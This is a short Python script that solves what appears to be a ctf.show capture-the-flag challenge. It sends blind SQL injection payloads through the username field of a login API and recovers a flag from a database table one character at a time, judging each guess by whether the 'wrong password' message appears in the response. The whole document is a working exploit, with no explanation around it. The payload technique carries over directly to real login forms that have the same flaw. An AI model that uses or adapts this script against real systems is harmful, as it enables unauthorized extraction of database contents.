import requests
url = "http://4f15a9a5-9519-4427-ab84-0cc29484aeab.challenge.ctf.show/api/"
flag = ""
table = "0123456789abcdef-{}_"

for i in range(1,99):
    for j in table:
        username_data = f"admin' and if(substr((select group_concat(f1ag) from ctfshow_fl0g), {i}, 1)regexp('{j}'), 1, 0)=1#"
        data = {'username': username_data,
                'password': 1}
        r = requests.post(url=url, data=data).text
        if r"\u5bc6\u7801\u9519\u8bef" in r:
            flag += j
            print(flag)
            if j == "}":
                exit()
            break